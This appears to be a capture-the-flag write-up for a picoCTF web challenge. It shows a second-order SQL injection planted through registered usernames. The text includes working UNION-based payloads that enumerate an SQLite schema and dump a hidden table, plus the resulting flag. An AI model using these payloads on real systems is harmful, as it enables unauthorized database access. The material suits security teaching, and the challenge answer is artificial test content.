📖 Description

Can you try to get the flag from our website? I've prepared my queries everywhere! I think!

Step 1: Initial Access & Registration

I started by visiting the web application and was presented with a welcome page.

I created an account with basic credentials to gain internal access:

  • Username: test
  • Email: test@test.com
  • Password: test1234

After registering, I was successfully logged into the dashboard.

Step 2: Dashboard & Features Recon

The application allows tracking and managing expenses via three main sections: Dashboard, Expenses, and Inbox. Navigating to the Expenses page, I added a dummy entry to test the functionality:

Description: Testing the expense Amount: 1000 Date: 2026-03-22

Clicking Generate Report yielded the message: "Report generation requested successfully! Check your inbox after 10 seconds!!!".

I navigated to the Inbox and downloaded the generated CSV:

cat report_test_1774205477.csv description,amount,date Testing the expense,1000.0,2026-03-22

Step 3: Identifying the Vulnerability

At this point, nothing seemed exploitable directly in the expense fields. I tested input handling by registering a new username containing a quote: test'.

After adding an expense and generating a report with this new user, checking the inbox revealed a fatal error:

🚨 Report generation failed. Cause unrecognized token: "'test''"

Downloading the report file resulted in an Internal Server Error.

This strongly indicated a Second-Order SQL Injection vulnerability. The username is being directly injected into an SQL query without sanitization during report generation:

SELECT description, amount, date FROM expenses WHERE username = '[USERNAME]'

Step 4: Finding Column Count

To perform a UNION-based SQL injection, I needed the correct number of columns. I registered a new users with the payloads: ' UNION SELECT 1,2,3,4 -- , ' UNION SELECT 1,2 --, which failed.

However, a 3-column payload succeeded:

# Register with Username: ' UNION SELECT 1,2,3 -- # Output of downloaded CSV: cat "report_' UNION SELECT 1,2,3 --_1774207021.csv" description,amount,date 1,2,3

✅ Column count = 3

Step 5: Enumerating Database Schema

I dumped the database schema using SQLite’s internal table with the following payload as the username:

' UNION SELECT name, sql, 'x' FROM sqlite_master --

The downloaded CSV revealed several tables: users, expenses, reports, inbox, and suspiciously, aDNyM19uMF9mMTRn.

Step 6: Identifying the Target Table

The table name aDNyM19uMF9mMTRn looked base64 encoded. Let's decode it:

echo "aDNyM19uMF9mMTRn" | base64 -d # Output: h3r3_n0_f14g

Despite the classic CTF misdirection ("here no flag"), the schema definition confirmed it was our target:

CREATE TABLE aDNyM19uMF9mMTRn ( name TEXT PRIMARY KEY, value TEXT NOT NULL )

Step 7: Extracting Table Data (Flag)

I created one final user with the payload to extract the name and value columns from the target table:

' UNION SELECT name, value, 'x' FROM aDNyM19uMF9mMTRn --

Downloading the final report CSV dumped the contents of the table, granting us the flag:

cat "report_' UNION SELECT name, value, 'x' FROM aDNyM19uMF9mMTRn --_1774208568.csv" description,amount,date flag,picoCTF{s3c0nd_0rd3r_1t_1s_28c0f73b},x
picoCTF{s3c0nd_0rd3r_1t_1s_28c0f73b}

P.S: Do not copy paste the flag; the last part of the flag is unique for every user.
